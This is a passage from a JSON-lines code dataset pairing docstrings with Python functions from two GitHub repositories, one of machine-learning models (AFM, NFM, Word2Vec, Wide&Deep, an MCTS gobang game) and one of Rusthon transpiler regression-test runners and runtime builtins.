tf.nn.l2_loss(Feat_Wgts) + l2_reg * tf.nn.l2_loss(Feat_Emb)\n\n# Provide an estimator spec for `ModeKeys.EVAL`\neval_metric_ops = {\n    \"auc\": tf.metrics.auc(labels, pred)\n}\nif mode == tf.estimator.ModeKeys.EVAL:\n    return tf.estimator.EstimatorSpec(\n        mode=mode,\n        predictions=predictions,\n        loss=loss,\n        eval_metric_ops=eval_metric_ops)\n\n#------build optimizer------\noptimizer = tf.train.AdamOptimizer(learning_rate=learning_rate, beta1=0.9, beta2=0.999, epsilon=1e-8)\n\ntrain_op = optimizer.minimize(loss, global_step=tf.train.get_global_step())\n\n\n# Provide an estimator spec for `ModeKeys.TRAIN` modes\nif mode == tf.estimator.ModeKeys.TRAIN:\n    return tf.estimator.EstimatorSpec(\n        mode=mode,\n        predictions=predictions,\n        loss=loss,\n        train_op=train_op)", "path": "NFM\\NFM.py", "repo_name": "gutouyu/ML_CIA", "stars": 545, "license": "mit", "language": "python", "size": 217121}
{"docstring": "\"\"\"\n:param X:  \u5c0f\u65b9\u683c\u5de6\u4e0a\u89d2\u7684\u5750\u6807\n:param Y:\n\"\"\"\n", "func_signal": "def cross(self, X, Y):\n", "code": "cross_sz = 10\nself.canvas.create_line(X + cross_sz, Y + cross_sz, X - cross_sz, Y - cross_sz, width=4, fill=\"red\")\nself.canvas.create_line(X - cross_sz, Y + cross_sz, X + cross_sz, Y - cross_sz, width=4, fill=\"red\")", "path": "MCTS\\gobang.py", "repo_name": "gutouyu/ML_CIA", "stars": 545, "license": "mit", "language": "python", "size": 217121}
{"docstring": "\"\"\"Show image with landmarks\n:param image:\n:param landmarks:\n\"\"\"\n", "func_signal": "def show_landmarks(image, landmarks):\n", "code": "plt.imshow(image)\nplt.scatter(landmarks[:, 0], landmarks[:, 1], s=10, marker='.', c='r')\nplt.pause(1)", "path": "Torch\\5_Data Loading And Processing.py", "repo_name": "gutouyu/ML_CIA", "stars": 545, "license": "mit", "language": "python", "size": 217121}
{"docstring": "\"\"\"\u4e3aEstimator\u521b\u5efa\u4e00\u4e2ainput function\"\"\"\n", "func_signal": "def input_fn(data_file, num_epochs, shuffle, batch_size):\n", "code": "assert tf.gfile.Exists(data_file), \"{0} not found.\".format(data_file)\n\ndef parse_csv(line):\n    print(\"Parsing\", data_file)\n    # tf.decode_csv\u4f1a\u628acsv\u6587\u4ef6\u8f6c\u6362\u6210\u5f88a list of Tensor,\u4e00\u5217\u4e00\u4e2a\u3002record_defaults\u7528\u4e8e\u6307\u660e\u6bcf\u4e00\u5217\u7684\u7f3a\u5931\u503c\u7528\u4ec0\u4e48\u586b\u5145\n    columns = tf.decode_csv(line, record_defaults=_CSV_COLUMN_DEFAULTS)\n    features = dict(zip(_CSV_COLUMNS, columns))\n    labels = features.pop('income_bracket')\n    return features, tf.equal(labels, '>50K') # tf.equal(x, y) \u8fd4\u56de\u4e00\u4e2abool\u7c7b\u578bTensor\uff0c \u8868\u793ax == y, element-wise\n\ndataset = tf.data.TextLineDataset(data_file) \\\n            .map(parse_csv, num_parallel_calls=5)\n\nif shuffle:\n    dataset = dataset.shuffle(buffer_size=_NUM_EXAMPLES['train'] + _NUM_EXAMPLES['validation'])\n\ndataset = dataset.repeat(num_epochs)\ndataset = dataset.batch(batch_size)\n\niterator = dataset.make_one_shot_iterator()\nbatch_features, batch_labels = iterator.get_next()\nreturn batch_features, batch_labels", "path": "Wide&Deep\\wide_deep.py", "repo_name": "gutouyu/ML_CIA", "stars": 545, "license": "mit", "language": "python", "size": 217121}
{"docstring": "# iwords: (batch_size)\n# owords: (batch_size, context_size * 2)\n", "func_signal": "def forward(self, iwords, owords):\n", "code": "batch_size = iwords.size()[0]\ncontext_size = owords.size()[-1] # \u4e24\u8fb9\u7684context\u4e4b\u548c\n\nnwords = torch.FloatTensor(batch_size, context_size * self.n_negs).uniform_(0, self.vocab_size - 1).long()\n\nivectors = self.ivectors(iwords).unsqueeze(2) # (batch_size, embeding_dim, 1)\novectors = self.ovectors(owords) # (batch_size, context_size, embedding_dim)\nnvectors = self.ovectors(nwords).neg() #(batch_size, context_size * n_negs, embedding_dim)\n\noloss = torch.bmm(ovectors, ivectors).squeeze().sigmoid().log().mean() #(batch_size)\nnloss = torch.bmm(nvectors, ivectors).squeeze().sigmoid().log().view(-1, context_size, self.n_negs).sum(2).mean(1) #(batch_size)\nreturn -(oloss + nloss).mean()", "path": "Embedding\\code\\Word2Vec.py", "repo_name": "gutouyu/ML_CIA", "stars": 545, "license": "mit", "language": "python", "size": 217121}
{"docstring": "\"\"\"\n:param csv_file:  Path to the csv file with annotations.\n:param root_dir:  Directory with all the images.\n:param transform: callable, optional  Optional transform to be applied on a sample.\n\"\"\"\n", "func_signal": "def __init__(self, csv_file, root_dir, transform=None):\n", "code": "self.landmarks_frame = pd.read_csv(csv_file)\nself.root_dir = root_dir\nself.transform = transform", "path": "Torch\\5_Data Loading And Processing.py", "repo_name": "gutouyu/ML_CIA", "stars": 545, "license": "mit", "language": "python", "size": 217121}
{"docstring": "\"\"\" Don't need this - but good style.\n\"\"\"\n", "func_signal": "def __repr__(self):\n", "code": "s = \"AvaMoves:\" + str(len(self.GetMoves())) + \" JustPlayed:\" + str(self.playerJustMoved)\nreturn s", "path": "MCTS\\gobang.py", "repo_name": "gutouyu/ML_CIA", "stars": 545, "license": "mit", "language": "python", "size": 217121}
{"docstring": "# Max pooling over a (2, 2) window\n", "func_signal": "def forward(self, *input):\n", "code": "print(input)\nprint(len(input))\nx = F.max_pool2d(F.relu(self.conv1(input[0])), (2, 2))\nx = F.max_pool2d(F.relu(self.conv2(x)), 2)\nx = x.view(-1, self.num_flat_features(x))\nx = F.relu(self.fc1(x))\nx = F.relu(self.fc2(x))\nx = self.fc3(x)\nreturn x", "path": "Torch\\3_Neural_networks.py", "repo_name": "gutouyu/ML_CIA", "stars": 545, "license": "mit", "language": "python", "size": 217121}
{"docstring": "\"\"\" Create a deep clone of this game state.\n\"\"\"\n", "func_signal": "def Clone(self):\n", "code": "st = GameState(self.checkerboard.shape[0], self.win_num)\nst.playerJustMoved = self.playerJustMoved\nst.checkerboard = self.checkerboard.copy()\nreturn st", "path": "MCTS\\gobang.py", "repo_name": "gutouyu/ML_CIA", "stars": 545, "license": "mit", "language": "python", "size": 217121}
{"docstring": "# Convert word indexes to embeddings\n", "func_signal": "def forward(self, input_seq, input_lengths, hidden=None):\n", "code": "embedded = self.embedding(input_seq)\n# Pack padded batch of sequences for RNN module\npacked = nn.utils.rnn.pack_padded_sequence(embedded, input_lengths)\n# Forward pass throught GRU\noutputs, hidden = self.gru(packed, hidden)\n#Unpack padding\noutputs, _ = nn.utils.rnn.pad_packed_sequence(outputs)\n# Sum bidirectional GRU outputs\noutputs = outputs[:, :, :self.hidden_size] + outputs[:, :, self.hidden_size:]\n# Return output and final hidden state\nreturn outputs, hidden", "path": "Torch\\Chatbot_Tutorial.py", "repo_name": "gutouyu/ML_CIA", "stars": 545, "license": "mit", "language": "python", "size": 217121}
{"docstring": "\"\"\"Build Model function f(x) for Estimator.\"\"\"\n\n#------hyper parameters------\n", "func_signal": "def model_fn(features, labels, mode, params):\n", "code": "field_size = params['field_size']\nfeature_size = params['feature_size']\nembedding_size = params['embedding_size']\nl2_reg = params['l2_reg']\nlearning_rate = params['learning_rate']\n\ndropout = params['dropout']\nattention_factor = params['attention_factor']\n\n#------build weights------\nGlobal_Bias = tf.get_variable(\"bias\", shape=[1], initializer=tf.constant_initializer(0.0))\nFeat_Wgts = tf.get_variable(\"linear\", shape=[feature_size], initializer=tf.glorot_normal_initializer())\nFeat_Emb = tf.get_variable(\"emb\", shape=[feature_size, embedding_size], initializer=tf.glorot_normal_initializer())\n\n#------build feature------\nfeat_ids = features['feat_ids']\nfeat_vals = features['feat_vals']\nfeat_ids = tf.reshape(feat_ids, shape=[-1, field_size])\nfeat_vals = tf.reshape(feat_vals, shape=[-1, field_size]) # None * F\n\n#------build f(x)------\n\n# FM\u90e8\u5206: sum(wx)\nwith tf.variable_scope(\"Linear-part\"):\n    feat_wgts = tf.nn.embedding_lookup(Feat_Wgts, feat_ids) # None * F * 1\n    y_linear = tf.reduce_sum(tf.multiply(feat_wgts, feat_vals), 1)\n\n#Deep\u90e8\u5206\nwith tf.variable_scope(\"Embedding_Layer\"):\n    embeddings = tf.nn.embedding_lookup(Feat_Emb, feat_ids) # None * F * K\n    feat_vals = tf.reshape(feat_vals, shape=[-1, field_size, 1]) # None * F * 1\n    embeddings = tf.multiply(embeddings, feat_vals) # None * F * K\n\n\nwith tf.variable_scope(\"Pair-wise_Interaction_Layer\"):\n    num_interactions = field_size * (field_size - 1) / 2\n    element_wise_product_list = []\n    for i in range(0, field_size):\n        for j in range(i + 1, field_size):\n            element_wise_product_list.append(tf.multiply(embeddings[:, i, :], embeddings[:, j, :]))\n    element_wise_product_list = tf.stack(element_wise_product_list) # (F*(F-1)/2) * None * K stack\u62fc\u63a5\u77e9\u9635\n    element_wise_product_list = tf.transpose(element_wise_product_list, perm=[1,0,2]) # None * (F(F-1)/2) * K\n\n# \u5f97\u5230Attention Score\nwith tf.variable_scope(\"Attention_Netowrk\"):\n\n    deep_inputs = tf.reshape(element_wise_product_list, shape=[-1, embedding_size]) # (None*F(F-1)/2) * K\n\n    deep_inputs = contrib.layers.fully_connected(inputs=deep_inputs, num_outputs=attention_factor, activation_fn=tf.nn.relu, \\\n                                         weights_regularizer=contrib.layers.l2_regularizer(l2_reg), scope=\"attention_net_mlp\")\n\n    aij = contrib.layers.fully_connected(inputs=deep_inputs, num_outputs=1, activation_fn=tf.identity, \\\n                                         weights_regularizer=contrib.layers.l2_regularizer(l2_reg), scope=\"attention_net_out\") # (None*F(F-1)/2) * 1\n\n    # \u5f97\u5230attention score\u4e4b\u540e\uff0c\u4f7f\u7528softmax\u8fdb\u884c\u89c4\u8303\u5316\n    aij = tf.reshape(aij, shape=[-1, int(num_interactions), 1])\n    aij_softmax = tf.nn.softmax(aij, dim=1, name=\"attention_net_softout\") # None * num_interactions\n\n    # TODO: \u4e3a\u4ec0\u4e48\u8981\u5bf9attention score\u8fdb\u884cdropout\u90a3\uff1f? \u8fd9\u91cc\u4e0d\u662f\u5f88\u61c2\n    if mode == tf.estimator.ModeKeys.TRAIN:\n        aij_softmax = tf.nn.dropout(aij_softmax, keep_prob=dropout[0])\n\nwith tf.variable_scope(\"Attention-based_Pooling_Layer\"):\n    deep_inputs = tf.multiply(element_wise_product_list, aij_softmax) # None * (F(F-1)/2) * K\n    deep_inputs = tf.reduce_sum(deep_inputs, axis=1) # None * K Pooling\u64cd\u4f5c\n\n    # Attention-based Pooling Layer\u7684\u8f93\u51fa\u4e5f\u8981\u7ecf\u8fc7Dropout\n    if mode == tf.estimator.ModeKeys.TRAIN:\n        deep_inputs = tf.nn.dropout(deep_inputs, keep_prob=dropout[1])\n\n    # \u8be5\u5c42\u7684\u8f93\u51fa\u662f\u4e00\u4e2aK\u7ef4\u5ea6\u7684\u5411\u91cf\n\nwith tf.variable_scope(\"Prediction_Layer\"):\n    # \u76f4\u63a5\u8ddf\u4e0a\u8f93\u51fa\u5355\u5143\n    deep_inputs = contrib.layers.fully_connected(inputs=deep_inputs, num_outputs=1, activation_fn=tf.identity, \\\n                                         weights_regularizer=contrib.layers.l2_regularizer(l2_reg), scope=\"afm_out\") # None * 1\n    y_deep = tf.reshape(deep_inputs, shape=[-1]) # None\n\nwith tf.variable_scope(\"AFM_overall\"):\n    y_bias = Global_Bias * tf.ones_like(y_deep, dtype=tf.float32)\n    y = y_bias + y_linear + y_deep\n    pred = tf.nn.sigmoid(y)\n\n# set predictions\npredictions = {\"prob\": pred}\nexport_outputs = {tf.saved_model.signature_constants.DEFAULT_SERVING_SIGNATURE_DEF_KEY: tf.estimator.export.PredictOutput(predictions)}\n# Provide an estimator spec for `ModeKeys.PREDICT`\nif mode == tf.estimator.ModeKeys.PREDICT:\n    return tf.estimator.EstimatorSpec(\n        mode=mode,\n        predictions=predictions,\n        export_outputs=export_outputs)\n\n#------build loss------\nloss =  tf.reduce_mean(tf.nn.sigmoid_cross_entropy_with_logits(logits=y, labels=labels))+ l2_reg * tf.nn.l2_loss(Feat_Wgts) + l2_reg * tf.nn.l2_loss(Feat_Emb)\nlog_loss = tf.reduce_mean(tf.nn.sigmoid_cross_entropy_with_logits(logits=y, labels=labels))\n\n\n# Provide an estimator spec for `ModeKeys.EVAL`\neval_metric_ops = {\n    # \"logloss\": tf.losses.log_loss(pred, labels, weights=1.0, scope=None, epsilon=1e-07,loss_collection=tf.GraphKeys.LOSSES, reduction=tf.losses.Reduction.SUM_BY_NONZERO_WEIGHTS),\n    \"auc\": tf.metrics.auc(labels, pred),\n}\n\nif mode == tf.estimator.ModeKeys.EVAL:\n    return tf.estimator.EstimatorSpec(\n        mode=mode,\n        predictions=predictions,\n        loss=loss,\n        eval_metric_ops=eval_metric_ops)\n\n\n#------build optimizer------\noptimizer = tf.train.AdamOptimizer(learning_rate=learning_rate, beta1=0.9, beta2=0.999, epsilon=1e-8)\ntrain_op = optimizer.minimize(loss, global_step=tf.train.get_global_step())\n\n# Provide an estimator spec for `ModeKeys.TRAIN`\nif mode == tf.estimator.ModeKeys.TRAIN:\n    return tf.estimator.EstimatorSpec(\n        mode=mode,\n        predictions=predictions,\n        loss=log_loss, # \u53ea\u6253\u5370pure log_loss\uff0c\u4f46\u662f\u8bad\u7ec3\u4f9d\u65e7\u6309\u7167\u6574\u4e2a\u7684loss\u6765\u8bad\u7ec3\n        train_op=train_op)", "path": "AFM\\AFM.py", "repo_name": "gutouyu/ML_CIA", "stars": 545, "license": "mit", "language": "python", "size": 217121}
{"docstring": "\"\"\"Downloads data from url, and makes changes to match the CSV format.\"\"\"\n", "func_signal": "def _download_and_clean_file(filename, url):\n", "code": "temp_file, _ = urllib.request.urlretrieve(url)\nwith tf.gfile.Open(temp_file, 'r') as temp_eval_file:\n  with tf.gfile.Open(filename, 'w') as eval_file:\n    for line in temp_eval_file:\n      line = line.strip()\n      line = line.replace(', ', ',')\n      if not line or ',' not in line:\n        continue\n      if line[-1] == '.':\n        line = line[:-1]\n      line += '\\n'\n      eval_file.write(line)\ntf.gfile.Remove(temp_file)", "path": "Wide&Deep\\data\\data_download.py", "repo_name": "gutouyu/ML_CIA", "stars": 545, "license": "mit", "language": "python", "size": 217121}
{"docstring": "# \u8f93\u5165\u5df2\u7ecf\u662fcontext\u7684id\u5217\u8868\u4e86\n", "func_signal": "def forward(self, *input):\n", "code": "embeds = self.embedding(input[0]).mean(dim=0).view(1, -1)\n\nout = self.linear(embeds)\nlog_probs = F.log_softmax(out, dim=1)\nreturn log_probs", "path": "Embedding\\code\\Word2Vec.py", "repo_name": "gutouyu/ML_CIA", "stars": 545, "license": "mit", "language": "python", "size": 217121}
{"docstring": "\"\"\" Conduct a UCT search for itermax iterations starting from rootstate.\n    Return the best move from the rootstate.\n    Assumes 2 alternating players (player 1 starts), with game results in the range [0.0, 1.0].\"\"\"\n\n", "func_signal": "def UCT(rootstate, itermax, verbose=False):\n", "code": "rootnode = Node(state=rootstate)\n\nfor i in range(itermax):\n    node = rootnode\n    state = rootstate.Clone()\n\n    # Select\n    while node.untriedMoves == [] and node.childNodes != []:  # node is fully expanded and non-terminal\n        node = node.UCTSelectChild()\n        state.DoMove(node.move)\n\n    # Expand\n    if node.untriedMoves != []:  # if we can expand (i.e. state/node is non-terminal)\n        m = random.choice(node.untriedMoves)\n        state.DoMove(m)\n        node = node.AddChild(m, state)  # add child and descend tree\n\n    # Rollout - this can often be made orders of magnitude quicker using a state.GetRandomMove() function\n    while state.GetMoves() != []:  # while state is non-terminal\n        state.DoMove(random.choice(state.GetMoves()))\n\n    # Backpropagate\n    while node != None:  # backpropagate from the expanded node and work back to the root node\n        node.Update(state.GetResult(\n            node.playerJustMoved))  # state is terminal. Update node with result from POV of node.playerJustMoved\n        node = node.parentNode\n\n# Output some information about the tree - can be omitted\nif (verbose):\n    print(rootnode.TreeToString(0))\nelse:\n    print(rootnode.ChildrenToString())\n\nreturn sorted(rootnode.childNodes, key=lambda c: c.visits)[-1].move  # return the move that was most visited", "path": "MCTS\\gobang.py", "repo_name": "gutouyu/ML_CIA", "stars": 545, "license": "mit", "language": "python", "size": 217121}
{"docstring": "\"\"\" Update this node - one additional visit and result additional wins. result must be from the viewpoint of playerJustmoved.\n\"\"\"\n", "func_signal": "def Update(self, result):\n", "code": "self.visits += 1\nself.wins += result", "path": "MCTS\\gobang.py", "repo_name": "gutouyu/ML_CIA", "stars": 545, "license": "mit", "language": "python", "size": 217121}
{"docstring": "# \u5148\u5224\u65ad\u6700\u540e\u8fd9\u4e00\u6b65\u653e\u8fdb\u6765\u80fd\u4e0d\u80fd\u8d62\n", "func_signal": "def GetResult(self, playerjm, lastmove):\n", "code": "row, col = lastmove\nrows, cols = self.checkerboard.shape\nplayer_id = self.checkerboard[row, col]\n\n# \u884c\nfor i in range(row, -1, -1): #(-1,row]\n    if self.checkerboard[i][col] != player_id:\n        break\npre_len = row - i\nfor i in range(row, rows):\n    if self.checkerboard[i][col] != player_id:\n        break\nsufix_len = i - row\nlen =  pre_len + sufix_len - 1\nif len >= self.win_num:\n    if player_id == playerjm:\n        return 1.0\n    else:\n        return 0.0\n\n# \u5217\nfor i in range(col, -1, -1):\n    if self.checkerboard[row][i] != player_id:\n        break\npre_len = col - i\nfor i in range(col, cols):\n    if self.checkerboard[row][i] != player_id:\n        break\nsufix_len = i - col\nlen = pre_len + sufix_len - 1\nif len >= self.win_num:\n    if player_id == playerjm:\n        return 1.0\n    else:\n        return 0.0\n\n# \u5de6\u4e0a\u5230\u53f3\u4e0b\ni = row; j = col\npre_len = 0\nwhile i >= 0 and j >= 0:\n    if board.checkerboard[i, j] == player_id:\n        pre_len += 1\n        i -= 1\n        j -= 1\n    else:\n        break\n\nsufix_len = 0\ni = row; j = col\nwhile i < self.rows and j < cols:\n    if self.checkerboard[i, j] == player_id:\n        sufix_len += 1\n        i += 1\n        j += 1\n    else:\n        break\nlen = pre_len + sufix_len - 1\nif len >= self.win_num:\n    if player_id == playerjm:\n        return 1.0\n    else:\n        return 0.0\n\n# \u5de6\u4e0b\u5230\u53f3\u4e0a\ni = row; j = col\npre_len = 0\nwhile i < rows and j > 0:\n    if self.checkerboard[i, j] == player_id:\n        pre_len += 1\n        i += 1\n        j -= 1\n    else:\n        break\n\nsufix_len = 0\ni = row; j = col\nwhile i > 0 and j < cols:\n    if self.checkerboard[i, j] == player_id:\n        sufix_len += 1\n        i -= 1\n        j += 1\n    else:\n        break\nlen = pre_len + sufix_len - 1\nif len >= self.win_num:\n    if player_id == playerjm:\n        return 1.0\n    else:\n        return 0.0\n\n# \u5982\u679c\u6ca1\u8d62\uff0c\u90a3\u770b\u540e\u9762\u8fd8\u6709\u4f4d\u7f6e\u6ca1\n# ids = map(np.unique, board.checkerboard)\nids = np.unique(self.checkerboard)\nif 0 not in list(ids):\n    # \u6ca1\u6709\u4f4d\u7f6e\u4e86\n    return 0.5\n\n# \u8fd8\u80fd\u73a9\nreturn 0.5", "path": "MCTS\\gobang.py", "repo_name": "gutouyu/ML_CIA", "stars": 545, "license": "mit", "language": "python", "size": 217121}
{"docstring": "#a = A.foo(self)  ## TODO fix me, or support `super`\n", "func_signal": "def foo(self) -> int:\n", "code": "a  = A.prototype.foo(self)  ## workaround\na += 100\nreturn a", "path": "regtests\\class\\mi.py", "repo_name": "rusthon/Rusthon", "stars": 891, "license": "other", "language": "python", "size": 9308}
{"docstring": "#if instanceof( ob, Int8Array ) or instanceof( ob, Uint8Array ):  ## missing in safari\n#\treturn True\n", "func_signal": "def __is_typed_array( ob ):\n", "code": "if instanceof( ob, Int16Array ) or instanceof( ob, Uint16Array ):\n\treturn True\nelif instanceof( ob, Int32Array ) or instanceof( ob, Uint32Array ):\n\treturn True\nelif instanceof( ob, Float32Array ) or instanceof( ob, Float64Array ):\n\treturn True\nelse:\n\treturn False", "path": "src\\runtime\\builtins_core.py", "repo_name": "rusthon/Rusthon", "stars": 891, "license": "other", "language": "python", "size": 9308}
{"docstring": "\"\"\"Returns the file content as a string\"\"\"\n", "func_signal": "def read(filename):\n", "code": "f = open(filename)\ncontent = f.read()\nf.close()\nreturn content", "path": "regtests\\run.py", "repo_name": "rusthon/Rusthon", "stars": 891, "license": "other", "language": "python", "size": 9308}
{"docstring": "\"\"\"Run all the tests or the selected ones\"\"\"\n\n", "func_signal": "def run():\n", "code": "if not show_details:\n    headers =  [\"Py-\\nthon2\", \"Py-\\nthon3\"]\n    if pypy_runnable:\n        headers.append(\"PyPy\\n\")\n\n    if old_pypy_runnable:\n        headers.append(\"PyPy\\n1.9\")\n\n    if rhino_runnable:\n        headers.append(\"JS\\nRhino\")\n    if node_runnable:\n        headers.append(\"JS\\nNode\")\n\n    if nodewebkit_runnable:\n        headers.append(\"JS\\nWebkit\")\n\n    if rhino_runnable:\n        headers.append(\"JSJS\\nRhino\")\n\n    if node_runnable:\n        headers.append(\"JSJS\\nNode\")\n\n    if nodewebkit_runnable:\n        headers.append(\"JSJS\\nWebkit\")\n\n    if dart_runnable:\n        headers.append(\"Dart\\nDart\")\n\n    if node_runnable:\n\n        if dart2js_runnable:\n            headers.append(\"Dart\\nNode\")\n        if coffee_runnable:\n            headers.append(\"Coffe\\nNode\")\n\n        if luajs_runnable:\n            headers.append(\"LuaJS\\nNode\")\n\n    if lua_runnable:\n        headers.append(\"Lua\\nLua\")\n\n    if luajit_runnable:\n        headers.append(\"Lua\\nJIT\")\n    \n    if go_runnable:\n        headers.append(\"Go\\n-\")\n\n    if rust_runnable:\n        headers.append(\"Rust\\n-\")\n\n\n    print(table_header % (\"\", \"Regtest run on\")\n          + ''.join(table_cell % i.split('\\n')[0]\n                    for i in headers)\n          )\n    print(table_header % (\"\", \"\")\n          + ''.join(table_cell % i.split('\\n')[1]\n                    for i in headers\n                    )\n          )\nerrors = []\ntotal_errors = {}\nfor filename in files():\n\n    if show_details:\n        if os.path.abspath(filename) not in argv:\n            continue\n        print('*'*77)\n        print(filename)\n\n    if filename.startswith('./bench/'):\n        start_benchmark( os.path.split(filename)[-1] )\n\n    sum_errors = run_test_on(filename)\n    if sum_errors:\n        errors.append(filename)\n        for k, v in sum_errors.items():\n            total_errors[k] = total_errors.get(k, 0) + v\n\n    if filename.startswith('./bench/'):\n        end_benchmark( os.path.split(filename)[-1] )\n\n\nprint()\nif errors:\n    nr_errors = 0\n    if not show_details:\n        print(\"To see details about errors, run the commands:\")\n        for i in errors:\n            print('\\t%s %s' % (sys.argv[0], i))\n        print(\"\\nSummary of errors:\")\n        for k, v in total_errors.items():\n            print('\\t%d %s' % (v, k))\n            if k in ('Error', 'Translation error'):\n                nr_errors += v\n    if nr_errors == 0:\n        print(\"\\nRegression tests run fine but with warnings\")\n    sys.exit(nr_errors)\nelse:\n    print(\"Regression tests run fine\")\n    sys.exit(0)", "path": "regtests\\run.py", "repo_name": "rusthon/Rusthon", "stars": 891, "license": "other", "language": "python", "size": 9308}
{"docstring": "\"\"\"Patch the regression tests to add information into asserts\"\"\"\n", "func_signal": "def patch_assert(filename):\n", "code": "out = []\nfor i, line in enumerate(read(filename).split('\\n')):\n    out.append(re.sub(\"(TestError|TestWarning)\\((.*)\\)\",\n                      r'\\1(\"%s\",%d,\\2,u\"\"\"\\2\"\"\")' % (filename, i),\n                      line)\n               )\nreturn '\\n'.join(out)", "path": "regtests\\run.py", "repo_name": "rusthon/Rusthon", "stars": 891, "license": "other", "language": "python", "size": 9308}
{"docstring": "\"\"\"Run Dart2js using Node\"\"\"\n", "func_signal": "def run_dart2js_node(content):\n", "code": "write(\"%s.js\" % tmpname, content)\nreturn run_command(\"node %s.js\" % tmpname)", "path": "regtests\\run.py", "repo_name": "rusthon/Rusthon", "stars": 891, "license": "other", "language": "python", "size": 9308}
{"docstring": "## note: 10ms is the smallest possible time for setTimeout/Interval\n", "func_signal": "def __set_timeout(func, seconds):\n", "code": "ms = seconds * 1000\nid = setTimeout( func, ms )\nfunc._timeout_id = id\nreturn func", "path": "src\\runtime\\builtins_core.py", "repo_name": "rusthon/Rusthon", "stars": 891, "license": "other", "language": "python", "size": 9308}
{"docstring": "\"\"\"PyPy\"\"\"\n", "func_signal": "def run_pypy_test_on(filename):\n", "code": "write(\"%s.py\" % tmpname, patch_python(filename, python='PYPY'))\nreturn run_command(\"%s %s.py %s\" % (pypy_exe, tmpname, display_errors))", "path": "regtests\\run.py", "repo_name": "rusthon/Rusthon", "stars": 891, "license": "other", "language": "python", "size": 9308}
{"docstring": "\"\"\"PyPy 1.9\"\"\"\n", "func_signal": "def run_old_pypy_test_on(filename):\n", "code": "write(\"%s.py\" % tmpname, patch_python(filename, python='PYPY'))\nreturn run_command(\"%s %s.py %s\" % (old_pypy_exe, tmpname, display_errors))", "path": "regtests\\run.py", "repo_name": "rusthon/Rusthon", "stars": 891, "license": "other", "language": "python", "size": 9308}
{"docstring": "'''\nThis returns an array that is a minimal implementation of set.\nOften sets are used simply to remove duplicate entries from a list, \nand then it get converted back to a list, it is safe to use set for this.\n\nThe array prototype is overloaded with basic set functions:\n\tdifference\n\tintersection\n\tissubset\n\n'''\n\n", "func_signal": "def set(a):\n", "code": "s = []  ## the fake set ##\nfor item in a:\n\tif s.indexOf(item) == -1:\n\t\ts.push( item )\n\nreturn s", "path": "src\\runtime\\builtins_core.py", "repo_name": "rusthon/Rusthon", "stars": 891, "license": "other", "language": "python", "size": 9308}
{"docstring": "\"\"\"Run Lua.js using Node\"\"\"\n", "func_signal": "def run_luajs_node(content):\n", "code": "builtins = read(os.path.join(\"../external/lua.js\", \"lua.js\"))\nwrite(\"%s.js\" % tmpname, builtins + '\\n' + content)\nreturn run_command(\"node %s.js\" % tmpname)", "path": "regtests\\run.py", "repo_name": "rusthon/Rusthon", "stars": 891, "license": "other", "language": "python", "size": 9308}
{"docstring": "\"\"\"Run Javascript using Node\"\"\"\n#builtins = read(os.path.join(\"../pythonjs\", \"pythonjs.js\"))\n", "func_signal": "def run_js_node(content):\n", "code": "write(\"/tmp/mymodule.js\", content)\nlines = [\n    \"var requirejs = require('requirejs')\",\n    \"var module = requirejs('mymodule')\",\n    \"module.main()\"\n]\nwrite(\"%s.js\" % tmpname, '\\n'.join(lines))\nreturn run_command(\"node %s.js\" % tmpname)", "path": "regtests\\run.py", "repo_name": "rusthon/Rusthon", "stars": 891, "license": "other", "language": "python", "size": 9308}
{"docstring": "\"\"\"Run the function if the JS code is not empty\"\"\"\n", "func_signal": "def run_if_no_error(function):\n", "code": "global js\nif js:\n    return function(js)\nelse:\n    return {'Translation error':1}", "path": "regtests\\run.py", "repo_name": "rusthon/Rusthon", "stars": 891, "license": "other", "language": "python", "size": 9308}
{"docstring": "\"\"\"Python3\"\"\"\n", "func_signal": "def run_python3_test_on(filename):\n", "code": "write(\"%s.py\" % tmpname, patch_python(filename, python='PYTHON3'))\nreturn run_command(\"python3 %s.py %s\" % (tmpname, display_errors))", "path": "regtests\\run.py", "repo_name": "rusthon/Rusthon", "stars": 891, "license": "other", "language": "python", "size": 9308}
{"docstring": "\"\"\"Python2\"\"\"\n", "func_signal": "def run_python_test_on(filename):\n", "code": "write(\"%s.py\" % tmpname, patch_python(filename, python='PYTHON2'))\nreturn run_command(\"python %s.py %s\" % (tmpname, display_errors))", "path": "regtests\\run.py", "repo_name": "rusthon/Rusthon", "stars": 891, "license": "other", "language": "python", "size": 9308}
{"docstring": "\"\"\"Run CoffeeScript using Node\"\"\"\n#builtins = read(os.path.join(\"../pythonjs\", \"pythonjs.js\"))\n", "func_signal": "def run_coffee_node(content):\n", "code": "write(\"%s.js\" % tmpname, content)\nreturn run_command(\"node %s.js\" % tmpname)", "path": "regtests\\run.py", "repo_name": "rusthon/Rusthon", "stars": 891, "license": "other", "language": "python", "size": 9308}
{"docstring": "\"\"\"Rewrite the Python code\"\"\"\n", "func_signal": "def patch_python(filename, dart=False, python='PYTHONJS', backend=None):\n", "code": "code = patch_assert(filename)\n\n## a main function can not be simply injected like this for dart,\n## because dart has special rules about what can be created outside\n## of the main function at the module level.\n#if dart:\n#    out = []\n#    main_inserted = False\n#    for line in code.splitlines():\n#        if line.startswith('TestError') or line.startswith('TestWarning'):\n#            if not main_inserted:\n#                out.append('def main():')\n#                main_inserted = True\n#            out.append( '\\t'+line )\n#        else:\n#            out.append( line )\n#    code = '\\n'.join( out )\na = [\n    'PYTHON=\"%s\"'%python,\n    'BACKEND=\"%s\"'%backend,\n]\nif backend == 'RUST':\n    a.append(_patch_header_rust)\nelif backend in ('GO', 'CPP'):\n    a.append(_patch_header_go)\nelse:\n    a.append(_patch_header)\n\nif python != 'PYTHONJS':  ## remove extra type syntax to run in regular Python\n    code = typedpython.transform_source( code, strip=True )\n    a.append( _python_only_extra_header )\n\na.append( code )\n\nif not dart and python != 'PYTHONJS':\n    a.append( 'main()' )\n\nreturn '\\n'.join( a )", "path": "regtests\\run.py", "repo_name": "rusthon/Rusthon", "stars": 891, "license": "other", "language": "python", "size": 9308}
{"docstring": "\"\"\"Run Lua using Lua\"\"\"\n", "func_signal": "def run_lua_lua(content):\n", "code": "write(\"%s.lua\" % tmpname, content)\nreturn run_command(\"lua %s.lua\" % tmpname)", "path": "regtests\\run.py", "repo_name": "rusthon/Rusthon", "stars": 891, "license": "other", "language": "python", "size": 9308}
